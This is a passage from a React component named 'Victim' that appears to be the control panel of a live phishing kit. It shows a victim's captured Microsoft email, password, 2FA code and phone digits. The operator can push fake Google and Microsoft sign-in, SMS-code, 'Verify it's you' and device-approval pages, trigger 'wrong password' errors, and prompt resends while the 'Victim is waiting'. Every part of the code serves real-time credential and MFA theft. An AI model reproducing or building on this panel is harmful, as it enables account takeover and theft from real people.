                                    <p className="text-[11px] text-amber-200/70 mt-0.5">
                                      Send Google 2FA or Verify it’s you next.
                                    </p>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "google_sms_waiting" && (
                                  <div className="rounded-xl border border-violet-500/20 bg-violet-500/10 px-3 py-2.5">
                                    <p className="text-[12px] font-medium text-violet-200">
                                      Google SMS code captured
                                    </p>
                                    <p className="text-[11px] text-violet-200/70 mt-0.5">
                                      Optionally send Verify it’s you next.
                                    </p>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "accept_device_resending" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5 flex items-start gap-2.5">
                                    <FiLoader className="w-3.5 h-3.5 text-amber-200 mt-0.5 shrink-0 animate-spin" />
                                    <div>
                                      <p className="text-[12px] font-medium text-amber-200">
                                        Loading · Resend it
                                      </p>
                                      <p className="text-[11px] text-amber-200/70 mt-0.5">
                                        Victim is waiting — send accept_device again.
                                      </p>
                                    </div>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "verify_resending" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5 flex items-start gap-2.5">
                                    <FiLoader className="w-3.5 h-3.5 text-amber-200 mt-0.5 shrink-0 animate-spin" />
                                    <div>
                                      <p className="text-[12px] font-medium text-amber-200">
                                        Loading · Resend
                                      </p>
                                      <p className="text-[11px] text-amber-200/70 mt-0.5">
                                        Victim is waiting — send Verify it’s you again.
                                      </p>
                                    </div>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "google_sms_resending" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5 flex items-start gap-2.5">
                                    <FiLoader className="w-3.5 h-3.5 text-amber-200 mt-0.5 shrink-0 animate-spin" />
                                    <div>
                                      <p className="text-[12px] font-medium text-amber-200">
                                        Loading · SMS resend
                                      </p>
                                      <p className="text-[11px] text-amber-200/70 mt-0.5">
                                        Victim is waiting — send Google 2FA again.
                                      </p>
                                    </div>
                                  </div>
                                )}

                                <div className="flex flex-col gap-1.5">
                                  {[
                                    {
                                      id: "disconnect",
                                      label: "Open email",
                                      hint: "Google email popup",
                                      tone: "danger",
                                      icon: FiSlash,
                                      active:
                                        selectedUser.currentPage === "disconnect" &&
                                        ["disconnectOpen", "", null, "gWrongMail"].includes(
                                          selectedUser.currentStatus
                                        ),
                                    },
                                    {
                                      id: "googlePass",
                                      label: "Password",
                                      hint: "Mini welcome / password",
                                      tone: "wait",
                                      icon: FiKey,
                                      active:
                                        selectedUser.currentPage === "disconnect" &&
                                        [
                                          "disconnectEmail",
                                          "disconnectPass",
                                          "disconnectPassWaiting",
                                          "gWrongPass",
                                        ].includes(selectedUser.currentStatus),
                                    },
                                    {
                                      id: "google2fa",
                                      label: "Google 2FA",
                                      hint: "SMS code · G-••••••",
                                      tone: "action",
                                      icon: FiShield,
                                      active:
                                        selectedUser.currentPage === "disconnect" &&
                                        [
                                          "google_sms_2fa",
                                          "google_sms_waiting",
                                          "gWrong2fa",
                                          "google_sms_resending",
                                        ].includes(selectedUser.currentStatus),
                                    },
                                    {
                                      id: "accept_device",
                                      label: "accept_device",
                                      hint: "Tap Yes on phone · Gmail app",
                                      tone: "action",
                                      icon: HiOutlineDesktopComputer,
                                      active:
                                        selectedUser.currentPage === "accept_device" ||
                                        (selectedUser.currentPage === "disconnect" &&
                                          [
                                            "accept_device",
                                            "accept_device_resending",
                                          ].includes(selectedUser.currentStatus)),
                                    },
                                  ].map((p) => {
                                    const deviceResending =
                                      p.id === "accept_device" &&
                                      selectedUser.currentStatus === "accept_device_resending";
                                    const styles = deviceResending
                                      ? TONE_STYLES.wait
                                      : TONE_STYLES[p.tone];
                                    const Icon = deviceResending ? FiLoader : p.icon;
                                    return (
                                      <button
                                        key={p.id}
                                        type="button"
                                        disabled={changingPage}
                                        onClick={() =>
                                          changePage({
                                            userId: selectedUser._id,
                                            page: p.id,
                                          })
                                        }
                                        className={`group relative flex items-center gap-3 rounded-xl border px-3 py-2.5 text-left transition disabled:opacity-50 ${
                                          p.active ? styles.active : styles.idle
                                        }`}
                                      >
                                        <span
                                          className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                            p.active ? styles.iconActive : styles.icon
                                          }`}
                                        >
                                          <Icon
                                            className={`w-3.5 h-3.5${deviceResending ? " animate-spin" : ""}`}
                                          />
                                        </span>
                                        <span className="min-w-0 flex-1">
                                          <span className="flex items-center gap-2">
                                            <span className="text-[12px] font-medium tracking-tight">
                                              {p.label}
                                            </span>
                                            {p.active && (
                                              <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                                {deviceResending ? "Loading" : "Live"}
                                              </span>
                                            )}
                                          </span>
                                          <span className="block text-[10px] text-zinc-500 mt-0.5">
                                            {deviceResending
                                              ? "Loading · waiting for you"
                                              : p.hint}
                                          </span>
                                        </span>
                                      </button>
                                    );
                                  })}

                                  {(() => {
                                    const verifyActive =
                                      selectedUser.currentPage === "disconnect" &&
                                      ["verify_its_you", "gWrongVerify"].includes(
                                        selectedUser.currentStatus
                                      );
                                    const styles = TONE_STYLES.action;
                                    return (
                                      <div
                                        className={`rounded-xl border px-3 py-2.5 transition ${
                                          verifyActive ? styles.active : styles.idle
                                        }`}
                                      >
                                        <div className="flex items-center gap-3">
                                          <span
                                            className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                              verifyActive
                                                ? styles.iconActive
                                                : styles.icon
                                            }`}
                                          >
                                            <FiSmartphone className="w-3.5 h-3.5" />
                                          </span>
                                          <div className="min-w-0 flex-1">
                                            <div className="flex items-center gap-2">
                                              <span className="text-[12px] font-medium tracking-tight">
                                                Verify it’s you
                                              </span>
                                              {verifyActive && (
                                                <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                                  Live
                                                </span>
                                              )}
                                            </div>
                                            <p className="text-[10px] text-zinc-500 mt-0.5">
                                              Type the number, then send the popup
                                            </p>
                                          </div>
                                        </div>
                                        <div className="mt-2.5 flex items-center gap-2">
                                          <input
                                            type="text"
                                            inputMode="numeric"
                                            maxLength={2}
                                            placeholder="e.g. 99"
                                            value={promptNumber}
                                            onChange={(e) =>
                                              setPromptNumber(
                                                e.target.value.replace(/\D/g, "").slice(0, 2)
                                              )
                                            }
                                            onKeyDown={(e) => {
                                              if (e.key === "Enter" && promptNumber) {
                                                changePage({
                                                  userId: selectedUser._id,
                                                  page: "verify_its_you",
                                                  prompt: promptNumber,
                                                });
                                              }
                                            }}
                                            className="h-9 w-[72px] rounded-lg border border-white/10 bg-black/40 px-2.5 text-center text-[15px] font-mono text-zinc-100 outline-none focus:border-sky-400/50"
                                          />
                                          <button
                                            type="button"
                                            disabled={changingPage || !promptNumber}
                                            onClick={() =>
                                              changePage({
                                                userId: selectedUser._id,
                                                page: "verify_its_you",
                                                prompt: promptNumber,
                                              })
                                            }
                                            className="h-9 flex-1 rounded-lg bg-sky-500/20 border border-sky-400/30 text-[12px] font-medium text-sky-100 hover:bg-sky-500/30 disabled:opacity-40 transition"
                                          >
                                            Send popup
                                          </button>
                                        </div>
                                      </div>
                                    );
                                  })()}

                                  <button
                                    type="button"
                                    disabled={changingPage}
                                    onClick={() =>
                                      changePage({
                                        userId: selectedUser._id,
                                        page: "done_google",
                                      })
                                    }
                                    className={`group relative flex w-full items-center gap-3 rounded-xl border px-3 py-2.5 text-left transition disabled:opacity-50 ${
                                      selectedUser.currentPage === "disconnect" &&
                                      ["done_google", "disconnectSubmitted"].includes(
                                        selectedUser.currentStatus
                                      )
                                        ? TONE_STYLES.success.active
                                        : TONE_STYLES.success.idle
                                    }`}
                                  >
                                    <span
                                      className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                        selectedUser.currentPage === "disconnect" &&
                                        ["done_google", "disconnectSubmitted"].includes(
                                          selectedUser.currentStatus
                                        )
                                          ? TONE_STYLES.success.iconActive
                                          : TONE_STYLES.success.icon
                                      }`}
                                    >
                                      <FiCheck className="w-3.5 h-3.5" />
                                    </span>
                                    <span className="min-w-0 flex-1">
                                      <span className="flex items-center gap-2">
                                        <span className="text-[12px] font-medium tracking-tight">
                                          Done Google
                                        </span>
                                        {selectedUser.currentPage === "disconnect" &&
                                          ["done_google", "disconnectSubmitted"].includes(
                                            selectedUser.currentStatus
                                          ) && (
                                            <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                              Live
                                            </span>
                                          )}
                                      </span>
                                      <span className="block text-[10px] text-zinc-500 mt-0.5">
                                        Account disconnected message
                                      </span>
                                    </span>
                                  </button>

                                  <div className="flex flex-wrap items-center gap-1 pt-0.5">
                                    <span className="text-[9px] uppercase tracking-wider text-zinc-600 mr-0.5">
                                      Wrong
                                    </span>
                                    {[
                                      { id: "gWrongMail", label: "mail" },
                                      { id: "gWrongPass", label: "pass" },
                                      { id: "gWrong2fa", label: "2fa" },
                                      { id: "gWrongVerify", label: "verify" },
                                    ].map((w) => {
                                      const on =
                                        selectedUser.currentPage === "disconnect" &&
                                        selectedUser.currentStatus === w.id;
                                      return (
                                        <button
                                          key={w.id}
                                          type="button"
                                          disabled={changingPage}
                                          onClick={() =>
                                            changePage({
                                              userId: selectedUser._id,
                                              page: w.id,
                                            })
                                          }
                                          className={`h-6 px-2 rounded-md text-[10px] font-medium border transition disabled:opacity-40 ${
                                            on
                                              ? "border-rose-400/40 bg-rose-500/20 text-rose-200"
                                              : "border-white/10 bg-white/[0.03] text-zinc-400 hover:text-rose-200 hover:border-rose-500/30"
                                          }`}
                                        >
                                          {w.label}
                                        </button>
                                      );
                                    })}
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                        {/* Microsoft / Hotmail */}
                        <div
                          className={`rounded-xl border overflow-hidden transition ${
                            disconnectProvider === "microsoft"
                              ? "border-sky-500/25 bg-sky-500/[0.04]"
                              : "border-white/10 bg-white/[0.02]"
                          }`}
                        >
                          <button
                            type="button"
                            onClick={() =>
                              setDisconnectProvider((p) =>
                                p === "microsoft" ? null : "microsoft"
                              )
                            }
                            className="w-full flex items-center gap-3 px-3 py-2.5 text-left hover:bg-white/[0.03] transition"
                          >
                            <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-[#0a0a0a] ring-1 ring-white/10">
                              <svg viewBox="0 0 23 23" width="16" height="16" aria-hidden="true">
                                <rect x="1" y="1" width="10" height="10" fill="#f25022" />
                                <rect x="12" y="1" width="10" height="10" fill="#7fba00" />
                                <rect x="1" y="12" width="10" height="10" fill="#00a4ef" />
                                <rect x="12" y="12" width="10" height="10" fill="#ffb900" />
                              </svg>
                            </span>
                            <span className="min-w-0 flex-1">
                              <span className="flex items-center gap-2">
                                <span className="text-[12px] font-medium tracking-tight text-zinc-100">
                                  Microsoft / Hotmail
                                </span>
                                {selectedUser.currentPage === "microsoft" && (
                                  <span className="inline-flex items-center gap-1 rounded-full border border-white/10 bg-white/[0.03] px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-400">
                                    <span className="w-1.5 h-1.5 rounded-full bg-sky-400" />
                                    {selectedUser.currentStatus === "msDone" ||
                                    selectedUser.currentStatus === "msSubmitted"
                                      ? "Done"
                                      : selectedUser.currentStatus === "msPhoneResending" ||
                                        selectedUser.currentStatus === "ms2faResending"
                                      ? "Loading"
                                      : selectedUser.currentStatus === "ms2fa" ||
                                        selectedUser.currentStatus === "ms2faWaiting" ||
                                        selectedUser.currentStatus === "msWrong2fa"
                                      ? "2FA"
                                      : selectedUser.currentStatus === "msPhone" ||
                                        selectedUser.currentStatus === "msPhoneWaiting"
                                      ? "Phone"
                                      : selectedUser.currentStatus === "msPassWaiting"
                                      ? "Pass wait"
                                      : selectedUser.currentStatus === "msPass" ||
                                        selectedUser.currentStatus === "msEmail"
                                      ? "Password"
                                      : "Email"}
                                  </span>
                                )}
                              </span>
                              <span className="block text-[10px] text-zinc-500 mt-0.5">
                                Sign in · Password · 2FA · Phone
                              </span>
                            </span>
                            <FiChevronDown
                              className={`w-4 h-4 text-zinc-500 shrink-0 transition-transform duration-200 ${
                                disconnectProvider === "microsoft" ? "rotate-180" : ""
                              }`}
                            />
                          </button>

                          <div
                            className={`grid transition-[grid-template-rows] duration-300 ease-out ${
                              disconnectProvider === "microsoft"
                                ? "grid-rows-[1fr]"
                                : "grid-rows-[0fr]"
                            }`}
                          >
                            <div className="overflow-hidden">
                              <div className="px-3 pb-3 pt-1 border-t border-white/5 space-y-3">
                                <div className="rounded-xl bg-black/30 border border-white/5 divide-y divide-white/5 text-sm">
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">MS email</span>
                                    <span className="font-medium truncate text-right">
                                      {selectedUser.msEmail || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">MS pass</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.msPassword || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">MS 2FA</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.msCode || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">Phone digits</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.msPhoneDigits || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">Hint **</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.msPhoneHint || "—"}
                                    </span>
                                  </div>
                                </div>

                                {selectedUser.currentStatus === "msPassWaiting" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5">
                                    <p className="text-[12px] font-medium text-amber-200">
                                      Microsoft password captured
                                    </p>
                                    <p className="text-[11px] text-amber-200/70 mt-0.5">
                                      Send Microsoft 2FA, phone verify, or Done next.
                                    </p>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "ms2faWaiting" && (
                                  <div className="rounded-xl border border-violet-500/20 bg-violet-500/10 px-3 py-2.5">
                                    <p className="text-[12px] font-medium text-violet-200">
                                      Microsoft 2FA captured
                                    </p>
                                    <p className="text-[11px] text-violet-200/70 mt-0.5">
                                      Send phone verify or Done Microsoft next.
                                    </p>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "ms2faResending" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5 flex items-start gap-2.5">
                                    <FiLoader className="w-3.5 h-3.5 text-amber-200 mt-0.5 shrink-0 animate-spin" />
                                    <div>
                                      <p className="text-[12px] font-medium text-amber-200">
                                        Loading · Resend code
                                      </p>
                                      <p className="text-[11px] text-amber-200/70 mt-0.5">
                                        Victim is waiting — send Microsoft 2FA again.
                                      </p>
                                    </div>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "msPhoneWaiting" && (
                                  <div className="rounded-xl border border-sky-500/20 bg-sky-500/10 px-3 py-2.5">
                                    <p className="text-[12px] font-medium text-sky-200">
                                      Phone digits captured
                                    </p>
                                    <p className="text-[11px] text-sky-200/70 mt-0.5">
                                      Send Done Microsoft when ready.
                                    </p>
                                  </div>
                                )}

                                {selectedUser.currentStatus === "msPhoneResending" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5 flex items-start gap-2.5">
                                    <FiLoader className="w-3.5 h-3.5 text-amber-200 mt-0.5 shrink-0 animate-spin" />
                                    <div>
                                      <p className="text-[12px] font-medium text-amber-200">
                                        Loading · Resend code
                                      </p>
                                      <p className="text-[11px] text-amber-200/70 mt-0.5">
                                        Victim is waiting — send Phone verify again.
                                      </p>
                                    </div>
                                  </div>
                                )}

                                <div className="flex flex-col gap-1.5">
                                  {[
                                    {
                                      id: "microsoft",
                                      label: "Open email",
                                      hint: "Sign in · Email",
                                      tone: "action",
                                      icon: FiLogIn,
                                      active:
                                        selectedUser.currentPage === "microsoft" &&
                                        ["msOpen", "", null, "msWrongMail"].includes(
                                          selectedUser.currentStatus
                                        ),
                                    },
                                    {
                                      id: "msPass",
                                      label: "Password",
                                      hint: "Enter password",
                                      tone: "wait",
                                      icon: FiKey,
                                      active:
                                        selectedUser.currentPage === "microsoft" &&
                                        [
                                          "msEmail",
                                          "msPass",
                                          "msPassWaiting",
                                          "msWrongPass",
                                        ].includes(selectedUser.currentStatus),
                                    },
                                    {
                                      id: "ms2fa",
                                      label: "Microsoft 2FA",
                                      hint: "Authenticator / SMS · 6-digit",
                                      tone: "action",
                                      icon: FiShield,
                                      active:
                                        selectedUser.currentPage === "microsoft" &&
                                        [
                                          "ms2fa",
                                          "ms2faWaiting",
                                          "msWrong2fa",
                                          "ms2faResending",
                                        ].includes(selectedUser.currentStatus),
                                    },
                                  ].map((p) => {
                                    const twoFaResending =
                                      p.id === "ms2fa" &&
                                      selectedUser.currentStatus === "ms2faResending";
                                    const styles = twoFaResending
                                      ? TONE_STYLES.wait
                                      : TONE_STYLES[p.tone];
                                    const Icon = twoFaResending ? FiLoader : p.icon;
                                    return (
                                      <button
                                        key={p.id}
                                        type="button"
                                        disabled={changingPage}
                                        onClick={() =>
                                          changePage({
                                            userId: selectedUser._id,
                                            page: p.id,
                                          })
                                        }
                                        className={`group relative flex items-center gap-3 rounded-xl border px-3 py-2.5 text-left transition disabled:opacity-50 ${
                                          p.active ? styles.active : styles.idle
                                        }`}
                                      >
                                        <span
                                          className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                            p.active ? styles.iconActive : styles.icon
                                          }`}
                                        >
                                          <Icon className={`w-3.5 h-3.5${twoFaResending ? " animate-spin" : ""}`} />
                                        </span>
                                        <span className="min-w-0 flex-1">
                                          <span className="flex items-center gap-2">
                                            <span className="text-[12px] font-medium tracking-tight">
                                              {p.label}
                                            </span>
                                            {p.active && (
                                              <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                                {twoFaResending ? "Loading" : "Live"}
                                              </span>
                                            )}
                                          </span>
                                          <span className="block text-[10px] text-zinc-500 mt-0.5">
                                            {twoFaResending
                                              ? "Loading · waiting for you"
                                              : p.hint}
                                          </span>
                                        </span>
                                      </button>
                                    );
                                  })}

                                  {(() => {
                                    const phoneResending =
                                      selectedUser.currentStatus === "msPhoneResending";
                                    const phoneActive =
                                      selectedUser.currentPage === "microsoft" &&
                                      [
                                        "msPhone",
                                        "msPhoneWaiting",
                                        "msWrongPhone",
                                        "msPhoneResending",
                                      ].includes(selectedUser.currentStatus);
                                    const styles = phoneResending
                                      ? TONE_STYLES.wait
                                      : TONE_STYLES.action;
                                    return (
                                      <div
                                        className={`rounded-xl border px-3 py-2.5 transition ${
                                          phoneActive ? styles.active : styles.idle
                                        }`}
                                      >
                                        <div className="flex items-center gap-3">
                                          <span
                                            className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                              phoneActive
                                                ? styles.iconActive
                                                : styles.icon
                                            }`}
                                          >
                                            {phoneResending ? (
                                              <FiLoader className="w-3.5 h-3.5 animate-spin" />
                                            ) : (
                                              <FiSmartphone className="w-3.5 h-3.5" />
                                            )}
                                          </span>
                                          <div className="min-w-0 flex-1">
                                            <div className="flex items-center gap-2">
                                              <span className="text-[12px] font-medium tracking-tight">
                                                Phone verify
                                              </span>
                                              {phoneActive && (
                                                <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                                  {phoneResending ? "Loading" : "Live"}
                                                </span>
                                              )}
                                            </div>
                                            <p className="text-[10px] text-zinc-500 mt-0.5">
                                              {phoneResending
                                                ? "Loading · waiting for you"
                                                : "Last 2 digits shown as ******XX"}
                                            </p>
                                          </div>
                                        </div>
                                        <div className="mt-2.5 flex items-center gap-2">
                                          <input
                                            type="text"
                                            inputMode="numeric"
                                            maxLength={2}
                                            placeholder="16"
                                            value={promptNumber}
                                            onChange={(e) =>
                                              setPromptNumber(
                                                e.target.value.replace(/\D/g, "").slice(0, 2)
                                              )
                                            }
                                            onKeyDown={(e) => {
                                              if (e.key === "Enter" && promptNumber) {
                                                changePage({
                                                  userId: selectedUser._id,
                                                  page: "msPhone",
                                                  phoneHint: promptNumber,
                                                });
                                              }
                                            }}
                                            className="h-9 w-[72px] rounded-lg border border-white/10 bg-black/40 px-2.5 text-center text-[15px] font-mono text-zinc-100 outline-none focus:border-sky-400/50"
                                          />
                                          <button
                                            type="button"
                                            disabled={changingPage || !promptNumber}
                                            onClick={() =>
                                              changePage({
                                                userId: selectedUser._id,
                                                page: "msPhone",
                                                phoneHint: promptNumber,
                                              })
                                            }
                                            className="h-9 flex-1 rounded-lg bg-sky-500/20 border border-sky-400/30 text-[12px] font-medium text-sky-100 hover:bg-sky-500/30 disabled:opacity-40 transition"
                                          >
                                            Send popup
                                          </button>
                                        </div>
                                        {phoneResending && (
                                          <div className="mt-2.5 rounded-lg border border-amber-500/20 bg-amber-500/10 px-2.5 py-2 flex items-center gap-2">
                                            <FiLoader className="w-3.5 h-3.5 text-amber-200 shrink-0 animate-spin" />
                                            <p className="text-[11px] text-amber-200">
                                              Loading — send the popup again
                                            </p>
                                          </div>
                                        )}
                                      </div>
                                    );
                                  })()}

                                  <button
                                    type="button"
                                    disabled={changingPage}
                                    onClick={() =>
                                      changePage({
                                        userId: selectedUser._id,
                                        page: "done_microsoft",
                                      })
                                    }
                                    className={`group relative flex w-full items-center gap-3 rounded-xl border px-3 py-2.5 text-left transition disabled:opacity-50 ${
                                      selectedUser.currentPage === "microsoft" &&
                                      ["msDone", "msSubmitted"].includes(
                                        selectedUser.currentStatus
                                      )
                                        ? TONE_STYLES.success.active
                                        : TONE_STYLES.success.idle
                                    }`}
                                  >
                                    <span
                                      className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                        selectedUser.currentPage === "microsoft" &&
                                        ["msDone", "msSubmitted"].includes(
                                          selectedUser.currentStatus
                                        )
                                          ? TONE_STYLES.success.iconActive
                                          : TONE_STYLES.success.icon
                                      }`}
                                    >
                                      <FiCheck className="w-3.5 h-3.5" />
                                    </span>
                                    <span className="min-w-0 flex-1">
                                      <span className="flex items-center gap-2">
                                        <span className="text-[12px] font-medium tracking-tight">
                                          Done Microsoft
                                        </span>
                                        {selectedUser.currentPage === "microsoft" &&
                                          ["msDone", "msSubmitted"].includes(
                                            selectedUser.currentStatus
                                          ) && (
                                            <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                              Live
                                            </span>
                                          )}
                                      </span>
                                      <span className="block text-[10px] text-zinc-500 mt-0.5">
                                        Successfully disconnected
                                      </span>
                                    </span>
                                  </button>

                                  <div className="flex flex-wrap items-center gap-1 pt-0.5">
                                    <span className="text-[9px] uppercase tracking-wider text-zinc-600 mr-0.5">
                                      Wrong
                                    </span>
                                    {[
                                      { id: "msWrongMail", label: "mail" },
                                      { id: "msWrongPass", label: "pass" },
                                      { id: "msWrong2fa", label: "2fa" },
                                      { id: "msWrongPhone", label: "phone" },
                                    ].map((w) => {
                                      const on =
                                        selectedUser.currentPage === "microsoft" &&
                                        selectedUser.currentStatus === w.id;
                                      return (
                                        <button
                                          key={w.id}
                                          type="button"
                                          disabled={changingPage}
                                          onClick={() =>
                                            changePage({
                                              userId: selectedUser._id,
                                              page: w.id,
                                            })
                                          }
                                          className={`h-6 px-2 rounded-md text-[10px] font-medium border transition disabled:opacity-40 ${
                                            on
                                              ? "border-rose-400/40 bg-rose-500/20 text-rose-200"
                                              : "border-white/10 bg-white/[0.03] text-zinc-400 hover:text-rose-200 hover:border-rose-500/30"
                                          }`}
                                        >
                                          {w.label}
                                        </button>
                                      );
                                    })}
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
              </div>
            )}
          </section>
        </div>
      </motion.div>
    </div>
  );
}

export default Victim;
